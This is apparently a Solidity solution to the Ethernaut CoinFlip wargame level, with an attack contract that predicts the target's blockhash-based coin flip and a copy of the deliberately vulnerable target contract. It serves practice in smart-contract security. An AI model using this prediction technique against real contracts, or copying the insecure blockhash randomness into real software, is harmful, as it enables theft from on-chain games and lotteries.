// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';

/**
 * Used to solve level 3 (coinflip) in Ethernaut. 
 * Call AttackFlip() on ten different blocks. I've hard-coded my instance's contract address,
 * but you can change it for yours. This could be automated in truffle, but I didn't feel like
 * setting up a truffle project for this simple solution.
*/
contract FlipAttack {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip flipContract = CoinFlip(0xcA39721bE8979D6f147aC7717804D70C4E3466F1);

    function AttackFlip() external {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        flipContract.flip(side);
    }
}

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}